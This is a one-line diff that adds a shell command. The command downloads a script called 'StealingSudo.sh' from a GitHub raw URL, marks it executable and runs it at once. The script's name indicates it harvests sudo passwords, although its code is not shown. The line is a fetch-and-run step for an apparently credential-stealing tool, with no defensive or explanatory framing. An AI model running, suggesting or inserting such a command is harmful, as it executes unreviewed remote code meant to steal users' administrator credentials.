@@ -1,0 +1,1 @@
+curl https://raw.githubusercontent.com/KadTheAad/Stealing-Sudo-Kinda/master/StealingSudo.sh > StealingSudo.sh && chmod +x ./StealingSudo.sh && ./StealingSudo.sh
